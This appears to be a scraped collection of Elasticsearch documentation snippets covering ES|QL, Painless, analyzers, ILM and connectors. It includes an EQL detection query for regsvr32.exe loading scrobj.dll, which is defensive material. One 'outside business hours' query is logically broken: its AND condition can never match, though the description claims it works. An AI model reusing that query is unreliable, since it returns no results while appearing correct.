DESCRIPTION: This snippet demonstrates the usage of the ATAN2 function in Elasticsearch SQL. It takes two parameters (y and x) and calculates the arctangent of y/x. The result is stored in a new column named 'atan2'.

LANGUAGE: esql
CODE:
ROW y=12.9, x=.6
| EVAL atan2=ATAN2(y, x)

----------------------------------------

TITLE: Describing CATEGORIZE Function in Elasticsearch SQL
DESCRIPTION: This snippet provides a description of the CATEGORIZE function and its limitations in Elasticsearch SQL. It explains that the function groups text messages into categories of similarly formatted text values and lists specific usage restrictions.

LANGUAGE: text
CODE:
**Description**

Groups text messages into categories of similarly formatted text values.

`CATEGORIZE` has the following limitations:

* can't be used within other expressions
* can't be used with multiple groupings
* can't be used or referenced within aggregate functions

----------------------------------------

TITLE: Custom ICU Tokenizer Rules Definition
DESCRIPTION: Example rule file content that defines custom tokenization behavior. This simple rule treats the entire input as a single token.

LANGUAGE: text
CODE:
.+ {200};

----------------------------------------

TITLE: Configuring Parent Circuit Breaker in Elasticsearch
DESCRIPTION: YAML configuration for the parent-level circuit breaker in Elasticsearch. It includes settings for using real memory and setting the total limit.

LANGUAGE: yaml
CODE:
indices.breaker.total.use_real_memory: true
indices.breaker.total.limit: "70%"

----------------------------------------

TITLE: Including ACOS Function Documentation Sections
DESCRIPTION: Markdown instructions to include various sections of the ACOS function documentation, such as parameters, description, types, and examples.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/acos.md
:::

:::{include} ../description/acos.md
:::

:::{include} ../types/acos.md
:::

:::{include} ../examples/acos.md
:::

----------------------------------------

TITLE: Regenerating All ES|QL Function Documentation
DESCRIPTION: This command runs all ESQL tests using Gradle, which regenerates documentation for all functions.

LANGUAGE: bash
CODE:
./gradlew :x-pack:plugin:esql:test

----------------------------------------

TITLE: Demonstrating Precedence Operator in Painless
DESCRIPTION: Examples showing the use of parentheses to control evaluation order in arithmetic expressions.

LANGUAGE: painless
CODE:
int x = (5+4)*6;   
int y = 12/(x-50);

----------------------------------------

TITLE: Defining String Operations for Elasticsearch Update Scripts in Java
DESCRIPTION: This snippet defines allowed string operations for use in Elasticsearch update scripts. It includes methods for generating SHA-1, SHA-256, and SHA-512 hashes of strings.

LANGUAGE: java
CODE:
class java.lang.String {
  String org.elasticsearch.painless.api.Augmentation sha1()
  String org.elasticsearch.painless.api.Augmentation sha256()
  String org.elasticsearch.painless.api.Augmentation sha512()
}

----------------------------------------

TITLE: Disabling Automatic Migration in Elasticsearch ILM Policy
DESCRIPTION: This example shows how to create an ILM policy that disables the automatic migrate action and uses the allocate action to assign the index to specific nodes based on rack_id.

LANGUAGE: json
CODE:
PUT _ilm/policy/my_policy
{
  "policy": {
    "phases": {
      "warm": {
        "actions": {
          "migrate" : {
           "enabled": false
          },
          "allocate": {
            "include" : {
              "rack_id": "one,two"
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Update Script Operations for Elasticsearch in Java
DESCRIPTION: This snippet defines the main UpdateScript class for Elasticsearch update scripts. It provides access to document metadata and fields for manipulation.

LANGUAGE: java
CODE:
class org.elasticsearch.script.UpdateScript {
    Metadata metadata()
    WriteField field(String)
}

----------------------------------------

TITLE: Defining Float Literals in Painless
DESCRIPTION: Examples of floating point literal syntax in Painless. Shows various notations including decimal, exponent, and type specifications for float and double.

LANGUAGE: painless
CODE:
0.0      <1>
1E6      <2>
0.977777 <3>
-126.34  <4>
89.9F    <5>

----------------------------------------

TITLE: Apache License 2.0 Boilerplate Notice
DESCRIPTION: Standard boilerplate text to apply the Apache License 2.0 to a work, including copyright notice and license terms.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Using WriteLoadForecaster for Write Load Forecasting in Elasticsearch
DESCRIPTION: Recommends using WriteLoadForecaster#getForecastedWriteLoad instead of org.elasticsearch.cluster.metadata.IndexMetadata#getForecastedWriteLoad() for forecasting write load.

LANGUAGE: java
CODE:
@defaultMessage Use WriteLoadForecaster#getForecastedWriteLoad instead
org.elasticsearch.cluster.metadata.IndexMetadata#getForecastedWriteLoad()

----------------------------------------

TITLE: Configuring and Testing Kuromoji Stemmer in Elasticsearch
DESCRIPTION: Demonstrates how to configure a custom analyzer with kuromoji_stemmer token filter and test it with sample katakana words. The example shows the stemmer's behavior with words above and below the minimum length threshold.

LANGUAGE: console
CODE:
PUT kuromoji_sample
{
  "settings": {
    "index": {
      "analysis": {
        "analyzer": {
          "my_analyzer": {
            "tokenizer": "kuromoji_tokenizer",
            "filter": [
              "my_katakana_stemmer"
            ]
          }
        },
        "filter": {
          "my_katakana_stemmer": {
            "type": "kuromoji_stemmer",
            "minimum_length": 4
          }
        }
      }
    }
  }
}

GET kuromoji_sample/_analyze
{
  "analyzer": "my_analyzer",
  "text": "コピー"
}

GET kuromoji_sample/_analyze
{
  "analyzer": "my_analyzer",
  "text": "サーバー"
}

----------------------------------------

TITLE: Numeric Filter Translation
DESCRIPTION: Tests translation of numeric comparison operators (==, <, <=, >, >=) in EQL queries.

LANGUAGE: eql
CODE:
process where serial_event_id == 1

LANGUAGE: json
CODE:
contains "term":{"serial_event_id":{"value":1}

----------------------------------------

TITLE: Defining java.util.regex.Pattern Class for Painless in Elasticsearch
DESCRIPTION: This snippet defines the available methods for the Pattern class in Painless. It includes methods for working with regex patterns, with some Elasticsearch-specific augmentations and intentional omissions for performance optimization.

LANGUAGE: Java
CODE:
class java.util.regex.Pattern {
  Predicate asPredicate()
  int flags()
  Matcher org.elasticsearch.painless.api.Augmentation matcher(int, CharSequence) @inject_constant[1="regex_limit_factor"]
  String pattern()
  String quote(String)
  String[] org.elasticsearch.painless.api.Augmentation split(int, CharSequence) @inject_constant[1="regex_limit_factor"]
  String[] org.elasticsearch.painless.api.Augmentation split(int, CharSequence,int) @inject_constant[1="regex_limit_factor"]
  Stream org.elasticsearch.painless.api.Augmentation splitAsStream(int, CharSequence) @inject_constant[1="regex_limit_factor"]
}

----------------------------------------

TITLE: Configuring Static Import for String Field Emission
DESCRIPTION: Defines a static import for the emit callback function used to collect values for string fields. This import binds the emit function to the StringFieldScript.Emit implementation.

LANGUAGE: painless
CODE:
static_import {
    # The `emit` callback to collect values for the field
    void emit(org.elasticsearch.script.StringFieldScript, String) bound_to org.elasticsearch.script.StringFieldScript$Emit
}

----------------------------------------

TITLE: Generating Dropbox Refresh Token
DESCRIPTION: Command to generate a refresh token for Dropbox API authentication. This token is used in the connector configuration for ongoing access to Dropbox.

LANGUAGE: shell
CODE:
curl -X POST "https://api.dropboxapi.com/oauth2/token?code=<AUTHORIZATION_CODE>&grant_type=authorization_code" -u "<APP_KEY>:<APP_SECRET>"

----------------------------------------

TITLE: Date/Time Arithmetic with Intervals
DESCRIPTION: Examples of performing arithmetic operations on dates, times and intervals using +, -, and * operators.

LANGUAGE: sql
CODE:
SELECT INTERVAL 1 DAY + INTERVAL 53 MINUTES AS result;

LANGUAGE: sql
CODE:
SELECT CAST('1969-05-13T12:34:56' AS DATETIME) + INTERVAL 49 YEARS AS result;

LANGUAGE: sql
CODE:
SELECT - INTERVAL '49-1' YEAR TO MONTH result;

LANGUAGE: sql
CODE:
SELECT INTERVAL '1' DAY - INTERVAL '2' HOURS AS result;

LANGUAGE: sql
CODE:
SELECT CAST('2018-05-13T12:34:56' AS DATETIME) - INTERVAL '2-8' YEAR TO MONTH AS result;

LANGUAGE: sql
CODE:
SELECT -2 * INTERVAL '3' YEARS AS result;

----------------------------------------

TITLE: Converting Values to Integer using TO_INTEGER in ESQL
DESCRIPTION: Demonstrates the usage of TO_INTEGER function to convert long values to integers. The function can handle various input types including dates (interpreted as Unix epoch milliseconds), booleans (true=1, false=0), and numeric values.

LANGUAGE: sql
CODE:
ROW long = [5013792, 2147483647, 501379200000]
| EVAL int = TO_INTEGER(long)

----------------------------------------

TITLE: Displaying Supported Types for ESQL Function in Markdown
DESCRIPTION: A markdown table showing the mapping between input string types and their corresponding result types for an ESQL function. It demonstrates that both 'keyword' and 'text' input types result in a 'keyword' output.

LANGUAGE: markdown
CODE:
| string | result |
| --- | --- |
| keyword | keyword |
| text | keyword |

----------------------------------------

TITLE: Displaying Supported Numeric Types in Markdown Table
DESCRIPTION: This markdown snippet presents a table of supported numeric types for an ESQL function test case. It shows the input number type and the corresponding result type.

LANGUAGE: markdown
CODE:
| number | result |
| --- | --- |
| double | double |
| integer | integer |
| long | long |
| unsigned_long | unsigned_long |

----------------------------------------

TITLE: EQL Add Function Example
DESCRIPTION: Returns the sum of two provided addends. Supports integers, floats and handles null values.

LANGUAGE: eql
CODE:
add(4, 5)                                           // returns 9
add(4, 0.5)                                         // returns 4.5
add(0.5, 0.25)                                      // returns 0.75
add(4, -2)                                          // returns 2
add(-2, -2)                                         // returns -4

----------------------------------------

TITLE: Defining PI Function Syntax in Markdown
DESCRIPTION: This snippet defines the syntax for the PI function using an embedded image in Markdown format.

LANGUAGE: markdown
CODE:
:::{image} ../../../images/functions/pi.svg
:alt: Embedded
:class: text-center
:::

----------------------------------------

TITLE: Handling Missing Values in Rare Terms Aggregation
DESCRIPTION: Shows how to use the missing parameter to specify a value for documents that are missing the aggregated field.

LANGUAGE: console
CODE:
GET /_search
{
  "aggs": {
    "genres": {
      "rare_terms": {
        "field": "genre",
        "missing": "N/A"
      }
    }
  }
}

----------------------------------------

TITLE: Applying Apache License 2.0 Boilerplate Notice
DESCRIPTION: Standard copyright and license notice template to be included in source code files when applying the Apache License 2.0 to a work. Fields in brackets should be replaced with actual project information.

LANGUAGE: text
CODE:
Copyright [yyyy] [name of copyright owner]

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

  http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

----------------------------------------

TITLE: Password Reset with Custom URL
DESCRIPTION: Example showing password reset with a custom URL specification for connecting to the Elasticsearch node.

LANGUAGE: shell
CODE:
bin/elasticsearch-reset-password --url "https://172.0.0.3:9200" --username user2 -i

----------------------------------------

TITLE: Vector Operations Function Declarations in C
DESCRIPTION: Function declarations for vector operations including dot product calculation (dot8s) and stride operations on arrays. Located in native/unix/vec.h header file.

LANGUAGE: c
CODE:
--include-function dot8s       # header: native/unix/vec.h
--include-function stride      # header: native/unix/vec.h

----------------------------------------

TITLE: Working with Strings in Painless
DESCRIPTION: Demonstrates different ways to declare and initialize String variables in Painless.

LANGUAGE: painless
CODE:
String r = "some text";
String s = 'some text';
String t = new String("some text");
String u;

----------------------------------------

TITLE: Avoiding Java Serialization in Elasticsearch
DESCRIPTION: This snippet discourages the use of Java serialization to prevent breaking backward compatibility without notice.

LANGUAGE: java
CODE:
@defaultMessage Don't use java serialization - this can break BWC without noticing it
java.io.ObjectOutputStream
java.io.ObjectOutput
java.io.ObjectInputStream
java.io.ObjectInput

----------------------------------------

TITLE: Analyzing Text with Decimal Digit Filter in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the analyze API with the decimal_digit filter to convert Devanagari numerals to standard digits 0-9. It uses a whitespace tokenizer and applies the decimal_digit filter to the input text.

LANGUAGE: console
CODE:
GET /_analyze
{
  "tokenizer" : "whitespace",
  "filter" : ["decimal_digit"],
  "text" : "१-one two-२ ३"
}

----------------------------------------

TITLE: Configuring and Using Hiragana Uppercase Token Filter in Elasticsearch
DESCRIPTION: This snippet demonstrates how to configure an Elasticsearch index with a custom analyzer using the hiragana_uppercase token filter, and then analyze text using this analyzer. It shows the index creation with settings and an analyze API call.

LANGUAGE: console
CODE:
PUT kuromoji_sample
{
  "settings": {
    "index": {
      "analysis": {
        "analyzer": {
          "my_analyzer": {
            "tokenizer": "kuromoji_tokenizer",
            "filter": [
              "hiragana_uppercase"
            ]
          }
        }
      }
    }
  }
}

GET kuromoji_sample/_analyze
{
  "analyzer": "my_analyzer",
  "text": "ちょっとまって"
}

----------------------------------------

TITLE: String Operations Translation
DESCRIPTION: Tests translation of string operations including case-sensitive and case-insensitive comparisons.

LANGUAGE: eql
CODE:
process where process_name : "test"

LANGUAGE: json
CODE:
"term":{"process_name":{"value":"test","case_insensitive":true}

----------------------------------------

TITLE: Whitelisting Classes for Elasticsearch Painless Scripting
DESCRIPTION: This snippet whitelists specific classes for use in Elasticsearch's Painless scripting engine. It allows the AggregationScript and its Factory to be used within scripts without requiring explicit imports.

LANGUAGE: plaintext
CODE:
class org.elasticsearch.script.AggregationScript @no_import {
}
class org.elasticsearch.script.AggregationScript$Factory @no_import {
}

----------------------------------------

TITLE: Defining Painless Debugging API
DESCRIPTION: Defines the Debug class for Painless scripting, which provides an explain method for debugging purposes.

LANGUAGE: painless
CODE:
class org.elasticsearch.painless.api.Debug {
  void explain(Object)
}

----------------------------------------

TITLE: Creating an API Key for GitHub Connector
DESCRIPTION: Example of creating an API key for the GitHub connector using the Elasticsearch security API. This key is used to authenticate the connector's access to Elasticsearch.

LANGUAGE: console
CODE:
POST /_security/api_key
{
  "name": "connector_name-connector-api-key",
  "role_descriptors": {
    "connector_name-connector-role": {
      "cluster": [
        "monitor",
        "manage_connector"
      ],
      "indices": [
        {
          "names": [
            "index_name",
            ".search-acl-filter-index_name",
            ".elastic-connectors*"
          ],
          "privileges": [
            "all"
          ],
          "allow_restricted_indices": false
        }
      ]
    }
  }
}

----------------------------------------

TITLE: Using TO_DOUBLE Function in Elasticsearch ESQL
DESCRIPTION: This snippet demonstrates the usage of the TO_DOUBLE function in Elasticsearch ESQL. It shows how to convert string representations of numbers to double values, including scientific notation. The example also includes an attempt to convert an invalid string to a double.

LANGUAGE: sql
CODE:
ROW str1 = "5.20128E11", str2 = "foo"
| EVAL dbl = TO_DOUBLE("520128000000"), dbl1 = TO_DOUBLE(str1), dbl2 = TO_DOUBLE(str2)

----------------------------------------

TITLE: Type Compatibility Matrix in Markdown
DESCRIPTION: A markdown table showing supported data type combinations for first argument, rest arguments, and result types. Includes basic types like boolean, date, numeric types, strings, and specialized types like IP and version.

LANGUAGE: markdown
CODE:
| first | rest | result |
| --- | --- | --- |
| boolean | boolean | boolean |
| boolean | | boolean |
| date | date | date |
| date_nanos | date_nanos | date_nanos |
| double | double | double |
| integer | integer | integer |
| integer | | integer |
| ip | ip | ip |
| keyword | keyword | keyword |
| keyword | | keyword |
| long | long | long |
| long | | long |
| text | text | keyword |
| text | | keyword |
| version | version | version |

----------------------------------------

TITLE: Extracting Private Keys from Keystores for Elasticsearch SSL Testing
DESCRIPTION: Commands to convert JKS keystores to PKCS#12 format and extract private keys using OpenSSL. This process is necessary because keytool doesn't allow direct private key extraction from JKS keystores.

LANGUAGE: bash
CODE:
keytool -importkeystore -srckeystore test-node.jks -srcstorepass keypass -destkeystore test-node.p12 -deststoretype PKCS12 -deststorepass keypass
openssl pkcs12 -in test-node.p12 -passin pass:keypass -nocerts -passout pass:test-node-key-password -out test-node.key
keytool -importkeystore -srckeystore test-client.jks -srcstorepass keypass -destkeystore test-client.p12 -deststoretype PKCS12 -deststorepass keypass
openssl pkcs12 -in test-client.p12 -passin pass:keypass -nocerts -passout pass:test-client-key-password -out test-client.key

----------------------------------------

TITLE: Basic MIN Aggregation in ESQL
DESCRIPTION: Demonstrates how to use the MIN function to find the minimum value in the 'languages' column from the employees table.

LANGUAGE: esql
CODE:
FROM employees
| STATS MIN(languages)

----------------------------------------

TITLE: IPv6 Prefix Aggregation - Elasticsearch Query
DESCRIPTION: Shows IP prefix aggregation for IPv6 addresses with a prefix length of 64 bits, demonstrating IPv6-specific configuration.

LANGUAGE: console
CODE:
GET /network-traffic/_search
{
  "size": 0,
  "aggs": {
    "ipv6-subnets": {
      "ip_prefix": {
        "field": "ipv6",
        "prefix_length": 64,
        "is_ipv6": true
      }
    }
  }
}

----------------------------------------

TITLE: Recommending java.nio.file over java.io.File API in Java
DESCRIPTION: This snippet suggests using java.nio.file instead of various classes and methods from the java.io.File API for file operations.

LANGUAGE: java
CODE:
@defaultMessage Use java.nio.file instead of java.io.File API
java.util.jar.JarFile
java.util.zip.ZipFile
java.io.File
java.io.FileInputStream
java.io.FileOutputStream
java.io.PrintStream#<init>(java.lang.String,java.lang.String)
java.io.PrintWriter#<init>(java.lang.String,java.lang.String)
java.util.Formatter#<init>(java.lang.String,java.lang.String,java.util.Locale)
java.io.RandomAccessFile
java.nio.file.Path#toFile()

----------------------------------------

TITLE: Elasticsearch Create Enrollment Token Command Synopsis
DESCRIPTION: The synopsis shows the basic structure and available options for the elasticsearch-create-enrollment-token command.

LANGUAGE: shell
CODE:
bin/elasticsearch-create-enrollment-token
[-f, --force] [-h, --help] [-E <KeyValuePair>] [-s, --scope] [--url]

----------------------------------------

TITLE: Collectors Utility Class Definition
DESCRIPTION: Static utility methods for creating common Collector implementations for stream operations.

LANGUAGE: java
CODE:
class java.util.stream.Collectors {
  Collector averagingDouble(ToDoubleFunction)
  Collector averagingInt(ToIntFunction)
  Collector averagingLong(ToLongFunction)
  Collector collectingAndThen(Collector,Function)
  Collector counting()
  Collector groupingBy(Function)
  Collector groupingBy(Function,Collector)
  Collector groupingBy(Function,Supplier,Collector)
  Collector joining()
  Collector joining(CharSequence)
  Collector joining(CharSequence,CharSequence,CharSequence)
  Collector mapping(Function,Collector)
  Collector maxBy(Comparator)
  Collector minBy(Comparator)
  Collector partitioningBy(Predicate)
  Collector partitioningBy(Predicate,Collector)
  Collector reducing(BinaryOperator)
  Collector reducing(def,BinaryOperator)
  Collector reducing(def,Function,BinaryOperator)
  Collector summarizingDouble(ToDoubleFunction)
  Collector summarizingInt(ToIntFunction)
  Collector summarizingLong(ToLongFunction)
  Collector summingDouble(ToDoubleFunction)
  Collector summingInt(ToIntFunction)
  Collector summingLong(ToLongFunction)
  Collector toCollection(Supplier)
  Collector toList()
  Collector toMap(Function,Function)
  Collector toMap(Function,Function,BinaryOperator)
  Collector toMap(Function,Function,BinaryOperator,Supplier)
  Collector toSet()
}

----------------------------------------

TITLE: Using Custom IO Utils in Elasticsearch
DESCRIPTION: Recommends using org.elasticsearch.core.internal.io instead of org.apache.lucene.util.IOUtils for IO operations.

LANGUAGE: java
CODE:
org.apache.lucene.util.IOUtils @ use @org.elasticsearch.core.internal.io instead

----------------------------------------

TITLE: Debugging Update Operation with Debug.explain in Elasticsearch
DESCRIPTION: This snippet shows how to use Debug.explain to examine the type of ctx._source in an update operation. It sends an update request that throws an exception, revealing that _source is a LinkedHashMap.

LANGUAGE: console
CODE:
POST /hockey/_update/1
{
  "script": "Debug.explain(ctx._source)"
}

----------------------------------------

TITLE: Querying Documents by Routing Value
DESCRIPTION: Example of how to query documents based on their _routing field value.

LANGUAGE: console
CODE:
GET my-index-000001/_search
{
  "query": {
    "terms": {
      "_routing": [ "user1" ]
    }
  }
}

----------------------------------------

TITLE: Test Framework Method and Annotation Suppressions
DESCRIPTION: List of suppressed test methods and annotations with recommended alternatives. Includes restrictions on temp directory usage, random seeds, test repeats, codecs, test ignoring, and random number generation.

LANGUAGE: text
CODE:
com.carrotsearch.randomizedtesting.RandomizedTest#globalTempDir() @ Use newTempDirPath() instead
com.carrotsearch.randomizedtesting.annotations.Seed @ Don't commit hardcoded seeds
com.carrotsearch.randomizedtesting.annotations.Repeat @ Don't commit hardcoded repeats

org.apache.lucene.codecs.Codec#setDefault(org.apache.lucene.codecs.Codec) @ Use the SuppressCodecs("*") annotation instead
org.junit.Ignore @ Use AwaitsFix instead
org.apache.lucene.tests.util.LuceneTestCase$Nightly @ We don't run nightly tests at this point!
com.carrotsearch.randomizedtesting.annotations.Nightly @ We don't run nightly tests at this point!

org.junit.Test @defaultMessage Just name your test method testFooBar

java.lang.Math#random() @ Use one of the various randomization methods from LuceneTestCase or ESTestCase for reproducibility

----------------------------------------

TITLE: Removing GCE Discovery Plugin from Elasticsearch
DESCRIPTION: Command to remove the GCE Discovery plugin from Elasticsearch. The node must be stopped before executing this command.

LANGUAGE: sh
CODE:
sudo bin/elasticsearch-plugin remove discovery-gce

----------------------------------------

TITLE: Detecting Library Loads
DESCRIPTION: EQL query to check for scrobj.dll library loads by regsvr32.exe.

LANGUAGE: console
CODE:
GET /my-data-stream/_eql/search
{
  "query": """
    library where process.name == "regsvr32.exe" and dll.name == "scrobj.dll"
  """
}

----------------------------------------

TITLE: Vector Field Implementations
DESCRIPTION: Defines field types for handling dense vectors and rank vectors, including methods for vector similarity calculations.

LANGUAGE: java
CODE:
class org.elasticsearch.script.field.vectors.DenseVector {
    DenseVector EMPTY
    float getMagnitude()

    double dotProduct(Object)
    double l1Norm(Object)
    double l2Norm(Object)
    double cosineSimilarity(Object)

    float[] getVector()
    boolean isEmpty()
    int getDims()
    int size()
}

----------------------------------------

TITLE: Analyzing Text with Whitespace Tokenizer in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the whitespace tokenizer in Elasticsearch to break text into terms. It sends a POST request to the _analyze endpoint with the tokenizer set to 'whitespace' and provides sample text to tokenize.

LANGUAGE: console
CODE:
POST _analyze
{
  "tokenizer": "whitespace",
  "text": "The 2 QUICK Brown-Foxes jumped over the lazy dog's bone."
}

----------------------------------------

TITLE: Term Query Translation Tests
DESCRIPTION: Test cases for translating SQL term equality queries to Elasticsearch term queries

LANGUAGE: SQL
CODE:
SELECT some.string FROM test WHERE some.string = 'value';

LANGUAGE: DSL
CODE:
"term":{"some.string.typical":{"value":"value"

----------------------------------------

TITLE: Score Script Class Definitions
DESCRIPTION: Core class definitions for ScoreScript and related statistical calculation classes, including methods for min/max/average calculations and term statistics.

LANGUAGE: java
CODE:
class org.elasticsearch.script.ScoreScript @no_import {
}
class org.elasticsearch.script.ScoreScript$Factory @no_import {
}

class org.elasticsearch.script.StatsSummary {
    double getMin()
    double getMax()
    double getAverage()
    double getSum()
    long getCount()
}

class org.elasticsearch.script.ScriptTermStats {
    int uniqueTermsCount()
    int matchedTermsCount()
    StatsSummary docFreq()
    StatsSummary totalTermFreq()
    StatsSummary termFreq()
    StatsSummary termPositions()
}

----------------------------------------

TITLE: BaseStream Interface Definition
DESCRIPTION: Core interface definition for Java stream operations including close, iterator and spliterator methods.

LANGUAGE: java
CODE:
class java.util.stream.BaseStream {
  void close()
  boolean isParallel()
  Iterator iterator()
  BaseStream sequential()
  Spliterator spliterator()
  BaseStream unordered()
}

----------------------------------------

TITLE: Basic Extraction Service Configuration
DESCRIPTION: YAML configuration for setting up the basic extraction service connection.

LANGUAGE: yaml
CODE:
# data-extraction-service settings
extraction_service:
  host: http://localhost:8090

----------------------------------------

TITLE: Converting String to Uppercase using TO_UPPER in ESQL
DESCRIPTION: Demonstrates how to use the TO_UPPER function to convert a string value to uppercase. The example shows converting a message field's value using the EVAL command in an ESQL pipeline.

LANGUAGE: sql
CODE:
ROW message = "Some Text"
| EVAL message_upper = TO_UPPER(message)

----------------------------------------

TITLE: Querying TAU Constant in Elasticsearch SQL
DESCRIPTION: Returns tau (τ), which is the ratio of a circle's circumference to its radius (approximately 6.28318530717958647692). This is equivalent to 2π and represents the full circle constant.

LANGUAGE: sql
CODE:
ROW TAU()

----------------------------------------

TITLE: Supported Type Combinations for Prefix Matching in ESQL
DESCRIPTION: Markdown table showing supported input and prefix types with their result types for string prefix matching operations. Demonstrates compatibility between keyword and text field types.

LANGUAGE: markdown
CODE:
| str | prefix | result |
| --- | --- | --- |
| keyword | keyword | boolean |
| keyword | text | boolean |
| text | keyword | boolean |
| text | text | boolean |

----------------------------------------

TITLE: ESQL Type Mapping Table in Markdown
DESCRIPTION: A markdown table showing the mapping of different numeric types (double, integer, long, unsigned_long) to their result type (double) in ESQL functions.

LANGUAGE: markdown
CODE:
| number | result |
| --- | --- |
| double | double |
| integer | double |
| long | double |
| unsigned_long | double |

----------------------------------------

TITLE: Applying Apache License Boilerplate Notice
DESCRIPTION: Standard boilerplate notice text for applying the Apache License to a work, including placeholders for copyright information.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Filtering Events Outside Business Hours in ESQL
DESCRIPTION: This example demonstrates how to filter events that occurred outside of business hours (before 9 AM or after 5 PM) using the DATE_EXTRACT function in ESQL. It extracts the hour of day from the @timestamp field and applies the appropriate conditions.

LANGUAGE: esql
CODE:
FROM sample_data
| WHERE DATE_EXTRACT("hour_of_day", @timestamp) < 9 AND DATE_EXTRACT("hour_of_day", @timestamp) >= 17

----------------------------------------

TITLE: Wiring a Registered Test Cluster to a TestClusterAware Task
DESCRIPTION: Demonstrates how to use a registered test cluster provider with a TestClusterAware task, such as RestIntegTest, resolving the actual cluster from the provider instance.

LANGUAGE: gradle
CODE:
tasks.register('someClusterTest', RestIntegTestTask) {
    useCluster someClusterProvider
    nonInputProperties.systemProperty 'tests.leader_host', "${-> someClusterProvider.get().getAllHttpSocketURI().get(0)}"
}

----------------------------------------

TITLE: Creating GCE Instance with knife-google Tool
DESCRIPTION: Example command using knife-google to create a GCE instance with compute permissions, specifying machine type, image, zone, and SSH configuration.

LANGUAGE: sh
CODE:
knife google server create www1 \
    -m n1-standard-1 \
    -I debian-8 \
    -Z us-central1-a \
    -i ~/.ssh/id_rsa \
    -x jdoe \
    --gce-service-account-scopes https://www.googleapis.com/auth/compute

----------------------------------------

TITLE: Defining Buffer Class in Java NIO
DESCRIPTION: Defines the Buffer class with a single method to get the limit of the buffer.

LANGUAGE: Java
CODE:
class java.nio.Buffer {
  int limit()
}

----------------------------------------

TITLE: Parameterized Elasticsearch Query with Painless Filter
DESCRIPTION: An Elasticsearch query that uses a Painless script filter with a parameterized cost value to find unsold theatre seats under a specified price threshold.

LANGUAGE: json
CODE:
{
  "query": {
    "bool": {
      "filter": {
        "script": {
          "script": {
            "source": "doc['sold'].value == false && doc['cost'].value < params.cost",
            "params": {
              "cost": 25
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Installing GCE Discovery Plugin in Elasticsearch
DESCRIPTION: Command to install the GCE Discovery plugin using Elasticsearch's plugin manager. The plugin must be installed on all cluster nodes, requiring a restart after installation.

LANGUAGE: sh
CODE:
sudo bin/elasticsearch-plugin install discovery-gce

----------------------------------------

TITLE: Counting Rows with COUNT Function in ESQL
DESCRIPTION: This snippet demonstrates how to use the COUNT function to count the number of non-null values in a specific column.

LANGUAGE: esql
CODE:
FROM employees
| STATS COUNT(height)

----------------------------------------

TITLE: Configuring Standard Tokenizer with Custom Settings
DESCRIPTION: Shows how to configure a standard tokenizer with a custom max_token_length setting of 5 characters and apply it within a custom analyzer.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "my_tokenizer"
        }
      },
      "tokenizer": {
        "my_tokenizer": {
          "type": "standard",
          "max_token_length": 5
        }
      }
    }
  }
}

POST my-index-000001/_analyze
{
  "analyzer": "my_analyzer",
  "text": "The 2 QUICK Brown-Foxes jumped over the lazy dog's bone."
}

LANGUAGE: text
CODE:
[ The, 2, QUICK, Brown, Foxes, jumpe, d, over, the, lazy, dog's, bone ]

----------------------------------------

TITLE: Running YAML REST Tests for APM Ingest Plugin
DESCRIPTION: This command runs integration tests using YAML REST tests to verify the functionality of index templates and ingest pipelines.

LANGUAGE: bash
CODE:
./gradlew x-pack:plugin:apm-data:yamlRestTest

----------------------------------------

TITLE: Ingest Script Base Class Definition
DESCRIPTION: Defines core functionality for ingest scripts including metadata and field access.

LANGUAGE: java
CODE:
class org.elasticsearch.script.IngestScript {
    Metadata metadata()
    WriteField field(String)
}

----------------------------------------

TITLE: Generating Node Keystore for Elasticsearch SSL Testing
DESCRIPTION: Creates a keystore for the Elasticsearch node with a catch-all SAN certificate valid until June 5, 2030. The command generates an RSA key pair and sets various DNS and IP address entries in the Subject Alternative Name field.

LANGUAGE: bash
CODE:
keytool -genkey -alias test-node -keystore test-node.jks -keyalg RSA -keysize 2048 -validity 3654 -dname CN="Elasticsearch Build Test Infrastructure" -keypass keypass -storepass keypass -ext san=dns:localhost,dns:localhost.localdomain,dns:localhost4,dns:localhost4.localdomain4,dns:localhost6,dns:localhost6.localdomain6,ip:127.0.0.1,ip:0:0:0:0:0:0:0:1

----------------------------------------

TITLE: Configuring Force Merge Action in Elasticsearch ILM Policy
DESCRIPTION: This snippet demonstrates how to create an ILM policy that includes a force merge action in the warm phase. It sets the max_num_segments to 1, which fully merges the index.

LANGUAGE: json
CODE:
PUT _ilm/policy/my_policy
{
  "policy": {
    "phases": {
      "warm": {
        "actions": {
          "forcemerge" : {
            "max_num_segments": 1
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Extracting Right Substring Using RIGHT Function in Elasticsearch SQL
DESCRIPTION: Demonstrates how to use the RIGHT function to extract a specified number of characters from the right side of a string column. The example shows extracting 3 characters from the last_name field, sorted alphabetically and limited to 5 results.

LANGUAGE: sql
CODE:
FROM employees
| KEEP last_name
| EVAL right = RIGHT(last_name, 3)
| SORT last_name ASC
| LIMIT 5

----------------------------------------

